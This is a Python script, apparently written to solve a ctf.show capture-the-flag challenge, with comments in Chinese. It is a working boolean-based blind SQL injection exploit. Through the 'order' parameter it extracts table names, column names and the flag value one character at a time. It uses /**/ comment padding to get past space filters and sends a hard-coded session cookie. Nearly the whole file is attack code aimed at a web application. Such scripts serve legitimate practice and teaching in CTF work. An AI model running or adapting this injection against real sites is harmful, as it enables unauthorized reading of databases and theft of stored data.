import requests
# http://294be7b6-702f-4dcc-a967-e566c87099f3.challenge.ctf.show/user_main.php?order=5
chars = "{}-0123456789abcdefghijklmnopqrstuvwxyz" # 待测试字符
url = "http://294be7b6-702f-4dcc-a967-e566c87099f3.challenge.ctf.show/user_main.php" # 爆破地址

# 爆破表数量
hack_table_count = 2
hack_column_count = 1
# 猜测默认表名最长
default_tableName_length = 10
default_value_length = 50
# 注入字段名
hack_key = "order"
# 空值作为传递的输入
hack_null_value = "-1"
# 筛选目标值
hack_target = "flag_is_my_password"

getTable = True
getColumn = False
getValue = False

header = {
   "Cookie" : "PHPSESSID=6afeeb2f5bb37563381e5597914fabf0",
}

if getTable == True:
    ### 获取数据表明
    for n in range(0,hack_table_count):
        table_name = ''
        for i in range(1,default_tableName_length):
            for char in chars:
                params = {
                    hack_key : hack_null_value + "/**/or/**/ord(mid((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema/**/in/**/(database())/**/limit/**/1/**/offset/**/"+str(n)+")/**/from/**/"+str(i)+"/**/for/**/1))/**/in/**/("+str(ord(char))+")"
                }
                r = requests.get(url=url,params=params,headers=header)
                if hack_target in r.text:
                    table_name += char
        print("result:::" + table_name)

table_name = 'flag'
if getColumn == True:
    ### 获取字段名
    table_name_hex = table_name.encode('utf-8').hex()
    table_name_hex = '0x' + table_name_hex
    for n in range(0,hack_column_count):
        column_name = ''
        for i in range(1,default_tableName_length):
            for char in chars:
                params = {
                    hack_key : hack_null_value + "/**/or/**/ord(mid((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name/**/in/**/("+table_name_hex+")/**/limit/**/1/**/offset/**/"+str(n)+")/**/from/**/"+str(i)+"/**/for/**/1))/**/in/**/("+str(ord(char))+")"
                }
                r = requests.get(url=url,params=params,headers=header)
                if hack_target in r.text:
                    column_name += char
        print("result:::" + column_name)

if getValue == True:
    column_name = 'flag'
    for n in range(0,hack_column_count):
        value = ''
        for i in range(1,default_value_length):
            for char in chars:
                params = {
                    hack_key : hack_null_value + "/**/or/**/ord(mid((select/**/("+column_name+")/**/from/**/("+table_name+")/**/limit/**/1/**/offset/**/"+str(n)+")/**/from/**/"+str(i)+"/**/for/**/1))/**/in/**/("+str(ord(char))+")"
                }
                r = requests.get(url=url,params=params,headers=header)
                if hack_target in r.text:
                    value += char
        print("result:::" + value)
